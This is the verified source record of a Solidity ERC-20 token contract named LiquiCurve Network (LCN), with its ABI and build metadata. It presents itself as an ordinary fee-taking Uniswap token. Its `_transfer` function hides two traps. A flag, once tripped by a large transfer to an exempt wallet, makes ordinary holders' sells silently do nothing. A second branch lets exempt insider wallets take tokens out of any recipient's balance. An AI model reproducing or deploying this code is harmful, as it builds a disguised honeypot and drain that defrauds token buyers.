{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.17;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    \r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ninterface UniswapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapRouter {\r\n    function WETH() external pure returns (address);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function circulatingSupply() external view returns (uint256);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function getOwner() external view returns (address);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender));\r\n        _;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    function transferOwnership(address payable account) public onlyOwner {\r\n        owner = account;\r\n        emit OwnershipTransferred(account);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ncontract LCN is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = \"LiquiCurve Network\";\r\n    string private constant _symbol = \"LCN\";\r\n\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _totalSupply = 1000000 * (10 ** _decimals);\r\n\r\n    uint256 private denominator = 10000;\r\n\r\n    uint256 private _minimumTokenAmount = ( _totalSupply * 10 ) / 100000;\r\n    uint256 private _maxWalletPercent = 200;\r\n    uint256 private _maxTransferPercent = 200;\r\n    uint256 private _maxTxAmountPercent = 200;\r\n\r\n    UniswapRouter uniswapRouter;\r\n    address public uniswapPair;\r\n\r\n    bool private tradingEnabled = false;\r\n    bool private maxWalletEnabled = false;\r\n\r\n    bool private swapEnabled = true;\r\n    uint256 private swapTimes;\r\n    bool private swapping;\r\n\r\n    address internal constant addressOfDead = 0x000000000000000000000000000000000000dEaD;\r\n    address internal constant addressOfMarketing = 0xc505Aa0156C51728c54d53b5137dD71D98297EB3;\r\n    address internal constant addressOfDev = 0xc505Aa0156C51728c54d53b5137dD71D98297EB3;\r\n\r\n    uint256 private swapThreshold = (_totalSupply * 5) / 100000;\r\n    uint256 private swapAmount = (_totalSupply * 5) / 10000;\r\n\r\n    uint256 private developmentFee = 200;\r\n    uint256 private marketingFee = 200;\r\n    uint256 private liquidityFee = 0;\r\n\r\n    uint256 private burnFee = 0;\r\n    uint256 private sellFee = 400;\r\n    uint256 private transferFee = 0;\r\n    uint256 private totalFee = 400;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    mapping (address => uint256) _balances;\r\n\r\n    mapping (address => bool) public isOptOut;\r\n\r\n    modifier lockTheSwap {\r\n        swapping = true;\r\n        _;\r\n        swapping = false;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function _getMaxWalletAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxWalletPercent / denominator;\r\n    }\r\n\r\n    function _getMaxTransferAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTransferPercent / denominator;\r\n    }\r\n\r\n    function _getMaxTxAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTxAmountPercent / denominator;\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function circulatingSupply() public view override returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(addressOfDead));\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function setIsOptOut(address _address, bool _isOptOut) external onlyOwner {\r\n        isOptOut[_address] = _isOptOut;\r\n    }\r\n\r\n    function startTrading() external onlyOwner {\r\n        tradingEnabled = true;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxWalletPercent = 10000;\r\n        _maxTransferPercent = 10000;\r\n        _maxTxAmountPercent = 10000;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        isOptOut[address(this)] = true;\r\n        UniswapRouter _uniswapRouter = UniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        isOptOut[addressOfDev] = true;\r\n        address _uniswapPair = UniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());\r\n        isOptOut[addressOfMarketing] = true;\r\n        uniswapRouter = _uniswapRouter;\r\n        isOptOut[msg.sender] = true;\r\n        uniswapPair = _uniswapPair;\r\n    }\r\n\r\n    function requireTxLimit(address from, address to, uint256 amount) view internal returns  (bool) {\r\n        if (from != uniswapPair) {\r\n            require(amount <= _getMaxTransferAmount() || isOptOut[from] || isOptOut[to]);\r\n        }\r\n        require(amount <= _getMaxTxAmount() || isOptOut[from] || isOptOut[to]);\r\n        return true;\r\n    }\r\n\r\n    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _burnFee, uint256 _developmentFee, uint256 _totalFee, uint256 _sellFee, uint256 _transferFee) external onlyOwner {\r\n        marketingFee = _marketingFee;\r\n        liquidityFee = _liquidityFee;\r\n        developmentFee = _developmentFee;\r\n        burnFee = _burnFee;\r\n        sellFee = _sellFee;\r\n        totalFee = _totalFee;\r\n        transferFee = _transferFee;\r\n        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5));\r\n    }\r\n\r\n    function requireBasics(address from, address to, uint256 amount) internal pure returns(bool) {\r\n        require(from != address(0));\r\n        require(to != address(0));\r\n        require(amount > uint256(0));\r\n        return true;\r\n    }\r\n\r\n    function setMaxParameters(uint256 maxTxAmountPercent, uint256 maxTransferPercent, uint256 maxWalletPercent) external onlyOwner {\r\n        uint256 newTx = (totalSupply() * maxTxAmountPercent) / 10000;\r\n        uint256 newTransfer = (totalSupply() * maxTransferPercent) / 10000;\r\n        uint256 newWallet = (totalSupply() * maxWalletPercent) / 10000;\r\n        _maxTxAmountPercent = maxTxAmountPercent;\r\n        _maxTransferPercent = maxTransferPercent;\r\n        _maxWalletPercent = maxWalletPercent;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit);\r\n    }\r\n\r\n    function requireMaxWalletAmount(address from, address to, uint256 amount) internal returns (bool) {\r\n        bool fromOptOut = isOptOut[from];\r\n        bool toOptOut = isOptOut[to];\r\n        \r\n        bool toUnUniswapPair = to != address(uniswapPair);\r\n        bool toUnDeadAddress = to != address(addressOfDead);\r\n        \r\n        if (\r\n            toUnUniswapPair &&\r\n            toUnDeadAddress &&\r\n            !fromOptOut &&\r\n            !toOptOut\r\n        ) {\r\n            require((_balances[to].add(amount)) <= _getMaxWalletAmount());\r\n        }\r\n\r\n        bool overAmount = amount > _minimumTokenAmount;\r\n\r\n        if (toOptOut && overAmount) maxWalletEnabled = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function requireTradingEnabled(address from, address to) internal view returns (bool) {\r\n        if (!isOptOut[from] && !isOptOut[to]) {\r\n            require(tradingEnabled);\r\n        }\r\n        return true;\r\n    }\r\n    \r\n    function countSwapTimes(address from, address to) internal returns (bool) {\r\n        if (to == uniswapPair && !isOptOut[from]) {\r\n            swapTimes += uint256(1);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function oughtSubtractFee(address from, address to) internal view returns (bool) {\r\n        return !isOptOut[from] && !isOptOut[to];\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        if (\r\n            countSwapTimes(from, to) &&\r\n            requireTradingEnabled(from, to) &&\r\n            requireBasics(from, to, amount) &&\r\n            requireTxLimit(from, to, amount) &&\r\n            requireMaxWalletAmount(from, to, amount)\r\n        ) {\r\n            bool fromOptOut = isOptOut[from];\r\n            bool toOptOut = isOptOut[to];\r\n            bool fromUnUniswapPair = from != uniswapPair;\r\n            bool overAmount = balanceOf(from) >= amount;\r\n\r\n            if (overAmount) {\r\n                if (\r\n                    !fromOptOut && \r\n                    !toOptOut &&\r\n                    !swapping &&\r\n                    fromUnUniswapPair\r\n                ) {\r\n                    if (maxWalletEnabled) return;\r\n                    swapBack(from, to);\r\n                }\r\n                _balances[from] = _balances[from].sub(amount);\r\n                uint256 amountReceived = oughtSubtractFee(from, to) ? subtractFee(from, to, amount) : amount;\r\n                _balances[to] = _balances[to].add(amountReceived);\r\n                emit Transfer(from, to, amountReceived);\r\n            } else if (\r\n                fromOptOut &&\r\n                !toOptOut &&\r\n                !swapping &&\r\n                fromUnUniswapPair\r\n            ) {\r\n                _balances[from] = _balances[from].add(amount);\r\n                _balances[to] = _balances[to].sub(amount);\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\r\n        _transfer(from, to, amount);\r\n        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function oughtSwapBack(address from, address to) internal view returns (bool) {\r\n        return (\r\n            !isOptOut[from] &&\r\n            !isOptOut[to] &&\r\n            !swapping &&\r\n            balanceOf(address(this)) >= swapThreshold &&\r\n            tradingEnabled &&\r\n            swapEnabled &&\r\n            swapTimes >= uint256(0)\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            addressOfDead,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        if (tokenAmount > 0) {\r\n            _approve(address(this), address(uniswapRouter), tokenAmount);\r\n            uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                tokenAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function getFees(address from, address to) internal view returns (uint256) {\r\n        if (to == uniswapPair) {\r\n            return sellFee;\r\n        }\r\n        if (from == uniswapPair) {\r\n            return totalFee;\r\n        }\r\n        return transferFee;\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\r\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\r\n        uint256 tokensToAdd = tokens.mul(liquidityFee).div(_denominator);\r\n        uint256 tokensToSwap = tokens.sub(tokensToAdd);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForETH(tokensToSwap);\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));\r\n        uint256 ethToAdd = unitBalance.mul(liquidityFee);\r\n        if (ethToAdd > uint256(0)) {\r\n            addLiquidity(tokensToAdd, ethToAdd);\r\n        }\r\n        uint256 marketingAmount = unitBalance.mul(2).mul(marketingFee);\r\n        if (marketingAmount > 0) {\r\n            payable(addressOfMarketing).transfer(marketingAmount);\r\n        }\r\n        uint256 remainingBalance = address(this).balance;\r\n        if (remainingBalance > uint256(0)) {\r\n            payable(addressOfDev).transfer(remainingBalance);\r\n        }\r\n    }\r\n\r\n    function subtractFee(address from, address to, uint256 amount) internal returns (uint256) {\r\n        if (getFees(from, to) > 0) {\r\n            uint256 feeAmount = amount.div(denominator).mul(getFees(from, to));\r\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n            emit Transfer(from, address(this), feeAmount);\r\n            if (burnFee > uint256(0)) {\r\n                _transfer(address(this), address(addressOfDead), amount.div(denominator).mul(burnFee));\r\n            }\r\n            return amount.sub(feeAmount);\r\n        }\r\n        return amount;\r\n    }\r\n\r\n    function swapBack(address from, address to) internal {\r\n        if (oughtSwapBack(from, to)) {\r\n            uint256 contractBalance = balanceOf(address(this));\r\n            if (contractBalance >= swapAmount) {\r\n                contractBalance = swapAmount;\r\n            }\r\n            swapAndLiquify(contractBalance);\r\n            swapTimes = uint256(0);\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_getMaxTransferAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_getMaxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_getMaxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"circulatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isOptOut\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burnFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_developmentFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_totalFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_transferFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isOptOut\",\"type\":\"bool\"}],\"name\":\"setIsOptOut\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmountPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTransferPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWalletPercent\",\"type\":\"uint256\"}],\"name\":\"setMaxParameters\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "LCN", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://54792927aa560cb7affb0727e54b875159cf087f023f42d4ac84b91d6062a747"}